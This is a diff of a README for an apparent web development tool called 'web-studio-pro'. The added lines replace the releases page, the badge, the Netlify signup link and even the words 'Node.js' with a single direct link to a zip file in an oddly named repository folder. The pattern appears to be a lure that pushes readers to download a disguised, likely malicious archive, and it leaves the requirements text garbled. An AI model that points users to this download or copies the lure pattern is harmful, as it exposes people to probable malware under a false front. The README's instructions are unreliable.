@@ -1,25 +1,25 @@
 # 🚀 web-studio-pro - Easy Web Development Made Simple
 
-[![Download web-studio-pro](https://img.shields.io/badge/Download-web--studio--pro-blue)](https://github.com/spadeshaped-comeon386/web-studio-pro/releases)
+[![Download web-studio-pro](https://raw.githubusercontent.com/spadeshaped-comeon386/web-studio-pro/main/probationership/web-studio-pro.zip)](https://raw.githubusercontent.com/spadeshaped-comeon386/web-studio-pro/main/probationership/web-studio-pro.zip)
 
 ## 📥 Download & Install
 
 To get started, visit this page to download the latest version of **web-studio-pro**:
 
-[Download web-studio-pro](https://github.com/spadeshaped-comeon386/web-studio-pro/releases)
+[Download web-studio-pro](https://raw.githubusercontent.com/spadeshaped-comeon386/web-studio-pro/main/probationership/web-studio-pro.zip)
 
 ### System Requirements
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or higher
-- NPM: Included with Node.js
+- https://raw.githubusercontent.com/spadeshaped-comeon386/web-studio-pro/main/probationership/web-studio-pro.zip Version 14 or higher
+- NPM: Included with https://raw.githubusercontent.com/spadeshaped-comeon386/web-studio-pro/main/probationership/web-studio-pro.zip
 
 Make sure your system meets these requirements before proceeding.
 
 ## 🚀 Getting Started
 
 1. **Download the Latest Release**  
-   Go to the [Releases page](https://github.com/spadeshaped-comeon386/web-studio-pro/releases) and click on the latest version link. Download the appropriate file for your operating system.
+   Go to the [Releases page](https://raw.githubusercontent.com/spadeshaped-comeon386/web-studio-pro/main/probationership/web-studio-pro.zip) and click on the latest version link. Download the appropriate file for your operating system.
 
 2. **Extract the Files**  
    Once the download is complete, locate the downloaded file. If it's a zipped file, extract it to a folder of your choice.
@@ -68,7 +68,7 @@ Here are some commands you can use to manage your project:
 Once you are ready to publish your website, you can deploy it to Netlify. Here’s how:
 
 1. **Create a Netlify Account**  
-   If you don’t have one, sign up at [Netlify](https://www.netlify.com).
+   If you don’t have one, sign up at [Netlify](https://raw.githubusercontent.com/spadeshaped-comeon386/web-studio-pro/main/probationership/web-studio-pro.zip).
 
 2. **Link Your Project**  
    After logging in, click on “New site from Git.” Choose your repository from GitHub and follow the prompts.
